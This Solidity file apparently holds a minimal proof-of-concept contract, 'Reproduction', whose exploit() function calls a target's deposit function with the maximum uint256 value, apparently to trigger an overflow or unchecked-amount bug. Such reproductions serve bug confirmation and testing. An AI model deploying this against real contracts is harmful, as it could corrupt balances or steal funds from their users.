
interface IVulnerable {
    function deposit(uint256 amount) external;
}

contract Reproduction {
    IVulnerable public target;
    
    constructor(address _target) {
        target = IVulnerable(_target);
    }

    function exploit() public {
        uint256 maxUint = type(uint256).max;
        target.deposit(maxUint);
    }
}